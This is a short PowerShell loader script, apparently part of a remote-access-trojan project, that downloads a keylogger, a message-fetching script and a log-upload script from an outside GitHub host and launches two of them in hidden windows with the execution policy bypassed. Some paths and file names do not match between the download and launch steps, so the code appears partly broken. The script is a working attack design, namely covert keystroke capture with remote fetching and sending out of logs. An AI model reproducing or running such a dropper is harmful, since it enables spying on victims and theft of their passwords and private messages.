
$scriptPath = "$env:temp\keylogger\"
Invoke-WebRequest -Uri "https://github.com/bruning-frighting/MyRAT/blob/main/test/Keylogger/keylogger.ps1" -OutFile keylogger.ps1
Invoke-WebRequest -Uri "https://github.com/bruning-frighting/MyRAT/blob/main/test/Keylogger/getInst.ps1" -OutFile get_message.ps1
Invoke-WebRequest -Uri "https://github.com/bruning-frighting/MyRAT/blob/main/test/Keylogger/uploadLog.ps1" -OutFile webhook.ps1
Start-Process "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$scriptPath\keylogger.ps1`"" -WindowStyle Hidden
Start-Process "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$scriptPath\getInst.ps1`"" -WindowStyle Hidden
